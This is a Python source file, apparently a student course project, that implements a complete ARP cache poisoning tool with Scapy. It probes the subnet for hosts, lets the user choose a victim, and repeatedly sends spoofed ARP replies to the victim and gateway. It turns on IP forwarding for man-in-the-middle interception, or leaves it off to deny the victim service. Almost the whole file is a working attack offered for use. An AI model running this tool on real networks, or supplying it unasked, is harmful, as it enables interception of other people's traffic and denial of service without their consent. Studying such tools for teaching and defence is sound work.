#ARP Cache Poisoning Project v1.1 works on windows and linux
#CSE 5473
#Authors: Jim Dickson, Aaron Fuhrer, Adam Tetzlaff, Zach McGohan

#ArpPoison does exactly what its name implies, carries out arp poisoning attacks!
#Note: Doesn't currently work for IPv6 addresses

#Command line arguments 
#-h Prints help 
#-g [gateway_ip] Specifies the gateway IP to attack
#-v [victim_ip] Specifies the victim IP to attack
#-if  [interface_name] Specifies which interface to spoof from. If not specified it uses the default network interface
#-dos Doesn't enable IP routing causing a denial of service attack on the victim
#-t  Sets the packet timeout in seconds for the network probe (default is 2)
#-r [filename] Records the network traffic to the specified PCAP file [Coming Soon...]


import sys
import os
from scapy.all import *
from threading import Thread
import netifaces
import ipaddress

routing_enabled = None  #records the current state of routing on the machine
packet_timeout = 2  #default timeout for packets
conf.verb = 0

#Returns the OS platform of the host machine
def get_platform():
    platforms = {
        'linux1' : 'Linux',
        'linux2' : 'Linux', #for some older linux systems
        'darwin' : 'OS X',
        'win32' : 'Windows'
    }
    if sys.platform not in platforms:
        return sys.platform
    else:
        return platforms[sys.platform]
        
os_type = get_platform()
if(os_type=='Windows'):
    #import the necessary windows librarys
    import winreg
    import win32serviceutil

#returns a human readable interface name from the windows registry
def get_connection_name_from_guid(interface_guids):
    #populate the list with unknown interfaces first for each entry
    interface_names = ['(unknown interface)' for i in range(len(interface_guids))]
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    reg_key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
    for i in range(len(interface_guids)):
        try:
            #try and match the guid to a name
            reg_subkey = winreg.OpenKey(reg_key, interface_guids[i] + r'\Connection')
            interface_names[i] = winreg.QueryValueEx(reg_subkey, 'Name')[0]
        except FileNotFoundError:
            #couldnt find a matching name
            pass
    return interface_names
    
#returns the (human readable) driver name for the interface from the windows registry   
def get_driver_name_from_guid(interface_guids):
    #populate the list with unknown interfaces first for each entry
    interface_names = ['(unknown interface)' for i in range(len(interface_guids))]
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    reg_key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}')
    for i in range(winreg.QueryInfoKey(reg_key)[0]):
        subkey_name = winreg.EnumKey(reg_key, i)
        try:
            #try and match the guid to a name
            reg_subkey = winreg.OpenKey(reg_key, subkey_name)
            guid = winreg.QueryValueEx(reg_subkey, 'NetCfgInstanceId')[0]
            try:
                idx = interface_guids.index(guid)
                interface_names[idx] = winreg.QueryValueEx(reg_subkey, 'DriverDesc')[0]
            except ValueError:
                pass
        except PermissionError:
            #couldnt find a matching name
            pass
    return interface_names


#Gets the mac address for a given ip_address and adds it to the passed in results
def get_mac_address(ip_address, results, interface, time=packet_timeout):
    #resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), iface=interface, retry=0, timeout=time)
    resp, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=time, iface=interface)
    for send, rec in resp:
        #results.append((rec[ARP].hwsrc, rec[ARP].psrc))
        results.append((rec[0][1].hwsrc, rec[0][1].psrc))
        

#Lists out the available addresses found on the network and returns the gateway and victim ip/mac information
def get_addresses():
    #get the available interfaces
    interfaces = netifaces.interfaces()
    #get human readable interface names for windows
    nice_interfaces = None
    nice_interface = None
    if(os_type=='Windows'):
        nice_interfaces = get_driver_name_from_guid(interfaces)
    interface = None
    
    #check if the user specified an interface in the command line
    if("-if" not in sys.argv):
        try:
            #Print the available interfaces
            print("Available Interfaces:")
            if(os_type=='Linux'):
                for i in range(len(interfaces)):
                    print(str(i + 1) + ". " + interfaces[i])
            elif(os_type=='Windows'):
                for i in range(len(nice_interfaces)):
                    print(str(i + 1) + ". " + nice_interfaces[i])
                
            #Prompt the user for the interface to use
            if_num = int(input("Select from results the number for the interface you wish to use: "))
            while if_num < 1 or if_num > len(interfaces):
                if_num = int(input("Select a valid number: "))
                
            #Populate the interface choice for netifaces
            interface = interfaces[if_num-1]
            #populate nice interface for scapy
            nice_interface = nice_interfaces[if_num-1]
            
        except Exception as inst:
            #print an error
            print("Error getting interface selection from user")
            print(inst)
            restore_routing()
            sys.exit(-1)
    else:
        #user specified an interface on the command line
        
        #Populate interface object
        if(os_type=='Linux'):
            interface = sys.argv[sys.argv.index("-if")+1]
            
            #make sure the interface is valid
            if(interface not in interfaces):
                #invalid interface
                print("Error: interface passed in with -if is not in the list of interfaces")
                sys.exit(-1)
                
        elif(os_type=='Windows'):
            #get the human readable interface name
            nice_interface = sys.argv[sys.argv.index("-if")+1]
        
            #make sure the interface is valid
            if(nice_interface not in nice_interfaces):
                #invalid interface
                print("Error: interface passed in with -if is not in the list of interfaces")
                sys.exit(-1)
                
            #map the nice_interface to an interface for netifaces
            interface = interfaces[nice_interfaces.index(nice_interface)]
            
    results = []
    threads = []
        
    #check if the user provided a victim IP address
    if("-v" not in sys.argv):
            
        #Probe the subnet to get a list of the available hosts to attack
        print("Finding hosts on subnet. Please Wait...")
        
        #get the network interface info from netifaces
        addrs = netifaces.ifaddresses(interface)
        
        #get subnet mask string
        subnet_mask = addrs[netifaces.AF_INET][0]["netmask"]
        
        #get interface IP address string
        ip_addr = addrs[netifaces.AF_INET][0]["addr"]
        
        #calculate subnet mask bit length
        subnet_mask_len = sum([bin(int(x)).count("1") for x in subnet_mask.split(".")])
        
        #calculate number of subnet hosts
        subnet_hosts = 2**(32-subnet_mask_len)
        
        #get the network (starting) address string
        net_addr = str(ipaddress.IPv4Address(addrs[netifaces.AF_INET][0]["broadcast"])+1-subnet_hosts)
        
        try:
            #send arps for each host in the subnet (***there is a better way to do this with scapy ARP ping***)
            for address in ipaddress.IPv4Network(net_addr + '/' + str(subnet_mask_len)):
                dest = str(address)
                #make sure to omit current interface IP address from search so we dont attack ourselves
                if(ip_addr != dest):
                    #check OS to determine which of interface/nice_interface to send
                    if(os_type=='Linux'):
                        thread = Thread(target=get_mac_address, args=(dest, results, interface))
                    if(os_type=='Windows'):
                        print("Probing " + str(address))
                        #get_mac_address(dest,results,nice_interface, 1)
                        thread = Thread(target=get_mac_address, args=(dest, results, nice_interface))
                        #get_mac_address(dest,results)
                    thread.start()
                    threads.append(thread)

            #Wait for the threads to finish up their arp requests
            for thread in threads:
                thread.join()
        except Exception as inst:
            #error in threads
            print("Error probing hosts")
            print(inst)
            restore_routing()
            sys.exit(-1)

        #Print the results of the found IP addresses
        print("Results: ")
        for i, result in enumerate(results):
            print(str(i + 1) + ". MAC = " + result[0] + " | IP = " + result[1])
        
        try:
            #Prompt the user to select an IP address to attack
            selection = input("Select from the results the number for the MAC/IP address you wish to attack: ")
            while int(selection) < 1 or int(selection) > len(results):
                selection = input("Select a valid number: ")
        except Exception as inst:
            #print an error
            print("Error getting IP/MAC selection.")
            print(inst)
            restore_routing()
            sys.exit(-1)
        
        victim = results[int(selection) - 1]
        
    else:
        #'-v' found. 
        try:
            #make sure the passed in address is a valid IPv4 address
            vic_addr = ipaddress.IPv4Address(sys.argv[sys.argv.index("-v")+1])
        except Exception as err:
            print("Error: Invalid IP address passed into -v")
            print(err)
            restore_routing()
            sys.exit()
        
        try:
            #find mac address for given victim IP
            if(os_type=='Linux'):
                while(len(results) == 0):
                    print("Resolving victim MAC address...")
                    get_mac_address(str(vic_addr),results, interface, 2)
            elif(os_type=='Windows'):
                while(len(results) == 0):
                    print("Resolving victim MAC address...")
                    get_mac_address(str(vic_addr),results, nice_interface, 2)
            print("Victim IP: %s  MAC: %s" %(results[0],results[1]))
            
            #get the network interface info from netifaces
            addrs = netifaces.ifaddresses(interface)
            ip_addr = addrs[netifaces.AF_INET][0]["addr"]
            
            #make sure the user isn't attacking themselves
            if(vic_addr == ip_addr):
                #ask the user if they want to continue
                print("Warning: Victim IP address is the same as the selected interface IP. You are attacking yourself!")
                answer = raw_input("Are you sure you want to continue? (enter 'y' to continue with the attack) ")
                if(not(answer == 'y' or answer == 'Y')):
                    sys.exit(-1)
            
            #Populate victim object
            
            victim = results[0]
            
        except  Exception as inst:
            #invalid address
            print("Error: Couldn't resolve mac address for victim. If you sparatically get this error and are using NPCap you could try switching to WinPcap to see if the issue is resolved.")
            print(inst)
            restore_routing()
            sys.exit(-1)
        
    #Populate the gateway object with the appropriate (MAC,IP) tuple values
    gateway = (None, None)
    
    #clear results
    results = []
    
    #check if the "-g" option was passed in to the command line
    if("-g" in sys.argv):
        try:
            #get the gateway address and verify it is a valid address
            gate_ip = ipaddress.IPv4Address(sys.argv[sys.argv.index("-g")+1])
        except Exception as err:
            print("Error: Invalid IP address passed into -g")
            print(err)
            restore_routing()
            sys.exit(-1)
            
        try:
            #find the mac address for given gateway IP
            if(os_type=='Linux'):
                while(len(results) == 0):
                    print("Resolving Gateway MAC address...")
                    get_mac_address(str(gate_ip),results, interface, 2)
            elif(os_type=='Windows'):
                while(len(results) == 0):
                    print("Resolving Gateway MAC address...")
                    get_mac_address(str(gate_ip),results, nice_interface, 2)
            
            print("Gateway IP: %s  MAC: %s" %(results[0],results[1]))
            #Populate gateway object
            gateway = results[0]
            
        except Exception as inst:
            #invalid address
            print("Error: Couldn't resolve mac address for gateway. If you sparatically get this error and are using NPCap you could try switching to WinPcap to see if the issue is resolved.")
            print(inst)
            restore_routing()
            sys.exit(-1)
    
    else:
        try:
            #get the default gateway for the selected interface
            gateways = netifaces.gateways()[netifaces.AF_INET]
            def_gateway = [item for item in gateways if (True and interface) in item]
            gate_ip = def_gateway[0][0]
            
            #find the mac address for given gateway IP
            if(os_type=='Linux'):
                while(len(results) == 0):
                    print("Resolving Gateway MAC address...")
                    get_mac_address(gate_ip,results, interface, 2)
            if(os_type=='Windows'):
                while(len(results) == 0):
                    print("Resolving Gateway MAC address...")
                    get_mac_address(gate_ip,results, nice_interface, 2)
            
            print("Gateway IP: %s  MAC: %s" %(results[0],results[1]))
            #Populate gateway object
            gateway = results[0]
            
        except Exception as inst:
            #default gateway not found
            print("Error: Couldn't resolve mac address for gateway. If you sparatically get this error and are using NPCap you could try switching to WinPcap to see if the issue is resolved.")
            print(inst)
            restore_routing()
            sys.exit(-1)

    if(os_type=='Linux'):
        return (gateway, victim), interface
    if(os_type=='Windows'):
        return (gateway, victim), nice_interface

#Sends arp reply packets to poison the victim and gateway
def poison(gate_ip, vic_ip, gate_mac, vic_mac, interface):
    #, iface = interface
    send(ARP(op = 2, pdst = gate_ip, hwdst = gate_mac, psrc = vic_ip))
    send(ARP(op = 2, pdst = vic_ip, hwdst = vic_mac, psrc = gate_ip))

#Sends arp reply packets to reverse the poisoning on the network
def unpoison(gate_ip, vic_ip, gate_mac, vic_mac, interface):
    for i in range(0, 2):
        send(ARP(op = 2, pdst = gate_ip, psrc = vic_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = vic_mac), count = 1)
        send(ARP(op = 2, pdst = vic_ip, psrc = gate_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gate_mac), count = 1)
        time.sleep(2)
    
#Launches the arp attack against the passed in gateway and victim devices
def attack(gateway, victim, interface):
    try:
        #Send ARP replys until the user cancels program execution [ex: with ctrl-c]
        print("Arp poisoning...")
        while True:
            poison(gateway[1], victim[1], gateway[0], victim[0], interface)
            time.sleep(2)
            print("Still poisoning...")
    except KeyboardInterrupt:
        print("Reversing poisoning...")
        unpoison(gateway[1], victim[1], gateway[0], victim[0], interface)
        restore_routing()
        sys.exit(0)

        
#Enables IP forwarding
def enable_IP_forwarding():
    if(os_type=='Linux'):
        print("Starting Routing Service...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("Routing Service Started...")
    elif(os_type=='Windows'):
        try:
            #get registry key value for ip routing
            print("Reading Registry Keys...")
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters', 0, winreg.KEY_ALL_ACCESS)
            result = winreg.QueryValueEx(key, "IPEnableRouter")
            #get the status of the RemoteAccess service
            status = win32serviceutil.QueryServiceStatus("RemoteAccess")
            
            #check to see if IP routing is not already enabled and update routing_enable
            if(result[0] == 0 and status[1] == 1):
                #update the routing_enabled vars
                routing_enabled = False
                
                #enable IP forwarding
                print("Updating Registry Keys...")
                winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
                
                #close the key
                winreg.CloseKey(key)
                
                #start the routing and remote access service
                print("Starting Routing Service...")
                os.system("sc config RemoteAccess start= auto")
                win32serviceutil.StartService("RemoteAccess")
                print("Routing Service Started...")
                
            elif(result[0] == 1 and status[1] != 4):
                #Routing is enabled but the service is not started
                print("Routing Enabled But The Service Is Not Running.")
                print("Starting Routing Service...")
                os.system("sc config RemoteAccess start= auto")
                win32serviceutil.StartService("RemoteAccess")
                print("Routing Service Started...")
                
            elif(result[0] == 1 and status[1] == 4):
                #ip routing already enabled update routing_enabled and do nothing
                routing_enabled = True
                print("Routing already enabled...")
            else:
                raise
                
        except  Exception as inst:
            #print error
            print("Error: failed to enable IP routing")
            print(inst)
            sys.exit(-1)
    else:
        print("OS Type not set, strange...")
            

#Disables IP forwarding
def disable_IP_forwarding():
    if(os_type=='Linux'):
        print("Stopping Routing Service...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    elif(os_type=='Windows'):
        try:
            #get registry key value for ip routing
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters', 0, winreg.KEY_ALL_ACCESS)
            result = winreg.QueryValueEx(key, "IPEnableRouter")
            #check to see if IP routing is not already disabled and update routing_enable
            if(result[0] == 1):
                #update the routing_enabled vars
                routing_enabled = False
                
                #start the routing and remote access service
                print("Stoping Routing Service...")
                win32serviceutil.StopService("RemoteAccess")
                os.system("sc config RemoteAccess start= disabled")
                print("Routing Service Stopped...")
                
                #disable IP forwarding
                print("Reverting Registry Keys...")
                winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 0)
                
                
                #close the key
                winreg.CloseKey(key)
               
            else:
                #ip routing already enabled update routing_enabled and do nothing
                routing_enabled = False
                print("Routing already disabled...")
                
        except Exception as inst:
            #print error
            print("Error: failed to enable IP routing")
            print(inst)
            sys.exit(-1)
    else:
        print("OS Type not set, strange...")
        
def restore_routing():
    #restore the system routing to the previous state
    if(routing_enabled == True):
        #enable forwarding
        enable_IP_forwarding()
    elif(routing_enabled == False):
        #disable forwarding
        disable_IP_forwarding()
    #else:
        #routing_enabled not yet set. do nothing
        print("Routing_enabled Not Set...")
            
if __name__ == '__main__':
    #Check if the help argument was passed in
    if("-h" in sys.argv):
        #Display help
        print("")
        print("ArpPoison.py does exactly what its name implies, carries out arp poisoning attacks!")
        print("Doesn't currently work for IPv6 addresses")
        print("")
        print("Command Line Arguments")
        print("-h  Prints help")
        print("-g [gateway_ip]  Specifies the gateway IP to attack")
        print("-v [victim_ip]  Specifies the victim IP to attack (should be on the same subnet as the interface address)")
        print("-if  [interface_name]  Specifies which interface to spoof from. If not specified it uses the default network interface")
        print("-dos  Disables IP routing. This results in a denial of service attack on the victim. Omitting this option enables routing for the session")
        print("-t  Sets the packet timeout in seconds for the network probe (default is 2)")
        #print("-r [filename] Records the network traffic to the specified PCAP file [Coming soon...]")
        sys.exit(0)
        
    #make sure were running on a supported OS
    if(os_type != 'Windows' and os_type != 'Linux'):
        #OS type is not windows or linux. Print OS type and exit
        print("Error: %s operating systems are not currently supported" %(os_type))
        sys.exit(-1)
        
    try:
        #check if the Denial of Service Flag is set
        if("-dos" in sys.argv):
            disable_IP_forwarding()
        else:
            enable_IP_forwarding()
        
        if("-t" in sys.argv):
            packet_timeout = int(sys.argv[sys.argv.index("-t")+1])
            
        #get the addresses and interface for the attack
        addresses, inface = get_addresses()
        
        #start the attack
        attack(addresses[0], addresses[1], inface)
        
    finally:
        restore_routing()
            